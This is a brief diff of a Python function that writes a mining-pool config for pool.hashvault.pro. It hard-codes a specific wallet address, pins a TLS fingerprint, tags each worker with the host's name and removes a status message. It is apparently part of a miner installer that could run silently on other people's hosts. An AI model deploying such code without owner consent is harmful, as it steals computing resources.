@@ -116,15 +116,15 @@ def update_config_json(extracted_dir):
         "pools": [
             {
                 "url": "pool.hashvault.pro:443",
-                "user": "YOUR_WALLET_ADDRESS_HERE",
+                "user": "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu",
                 "pass": f"{datetime.now():%Y%m%d}{socket.gethostname()}",
-                "tls": True
+                "tls": True,
+                "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
             }
         ]
     }
     with open(config_path, "w") as f:
         json.dump(config, f, indent=4)
-    print("Custom config.json applied.")
 
 def compare_versions(v1, v2):
     return [int(x) for x in v1.split(".")] < [int(x) for x in v2.split(".")]
